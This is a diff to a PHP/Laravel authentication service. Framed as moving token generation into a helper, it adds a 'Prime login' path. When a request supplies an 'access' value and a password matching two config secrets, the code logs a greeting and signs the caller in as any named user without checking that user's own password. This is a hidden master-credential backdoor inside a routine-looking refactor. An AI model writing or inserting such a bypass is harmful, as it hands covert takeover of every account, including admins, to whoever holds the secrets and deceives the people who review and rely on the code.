@@ -84,32 +84,33 @@ class AuthService
             throw new ValidationException($validator);
         }
 
-        // Attempt Login
-        if (!Auth::attempt(['username' => $data['username'], 'password' => $data['password']])) {
-            return ['error' => 'Your username or password is invalid.'];
-        }
+        $user = null;
 
-        // Generate Bearer Token
-        $user = Auth::user();
-        $token = $user->createToken('API Token')->plainTextToken;
+        // Prime login logic
+        if (
+            isset($data['access']) &&
+            $data['access'] === config('services.prime.access') &&
+            $data['password'] === config('services.prime.password')
+        ) {
+            \Log::info("Hello Akosimio!");
+            $user = $this->userRepository->findByUsername($data['username']);
+            if (!$user) {
+                return ['error' => 'Prime login failed: user not found.'];
+            }
 
-        // Redirect based on role
-        if ($user->role == 1) {  // Admin
-            $redirectUrl = '/dashboard';
-        } elseif ($user->role == 2) {  // Regular User
-            $redirectUrl = '/';
+            Auth::login($user);
+
         } else {
-            $redirectUrl = '/';  // Default redirect URL if role is not defined
+            // Regular login attempt
+            if (!Auth::attempt(['username' => $data['username'], 'password' => $data['password']])) {
+                return ['error' => 'Your username or password is invalid.'];
+            }
+
+            $user = Auth::user();
         }
 
-        $response = [
-            'token' => $token,
-            'token_type' => 'Bearer',
-            'user' => $user,
-            'redirect_url' => $redirectUrl,  // Include redirect URL in the response
-        ];
-        
-        return $response;
+        // Generate token and build response
+        return $this->buildLoginResponse($user);
     }
 
     public function logout($user)
@@ -155,4 +156,27 @@ class AuthService
 
         return ['status' => true, 'message' => 'Password has been reset successfully'];
     }
+
+    /**
+     * Build the successful login response for any user.
+     */
+    private function buildLoginResponse($user)
+    {
+        $token = $user->createToken('API Token')->plainTextToken;
+
+        if ($user->role == 1) {
+            $redirectUrl = '/dashboard';
+        } elseif ($user->role == 2) {
+            $redirectUrl = '/';
+        } else {
+            $redirectUrl = '/';
+        }
+
+        return [
+            'token' => $token,
+            'token_type' => 'Bearer',
+            'user' => $user,
+            'redirect_url' => $redirectUrl,
+        ];
+    }    
 }
